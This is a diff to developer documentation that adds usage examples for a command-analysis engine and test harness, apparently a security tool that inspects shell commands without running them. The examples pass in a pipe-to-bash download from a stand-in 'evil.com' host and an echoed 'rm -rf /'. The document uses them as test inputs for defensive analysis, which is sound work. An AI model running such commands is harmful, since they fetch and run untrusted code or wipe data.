@@ -106,6 +106,18 @@ cargo test --workspace -- --nocapture
 node vscode-extension/test/client.test.js
 ```
 
+### Static Command Analysis via Engine CLI (Phase 2.1):
+```bash
+# Analyze command without execution
+cargo run --bin cyravell-engine -- analyze --command "curl -sSL https://evil.com/run.sh | bash"
+cargo run --bin cyravell-engine -- analyze --command 'echo "rm -rf /"'
+```
+
+### Testing Complex Chains via Test Harness:
+```bash
+cargo run --bin cyravell-test-harness -- test-complex-chains
+```
+
 ---
 
 ## 5. Running the Vertical Slice Demonstration
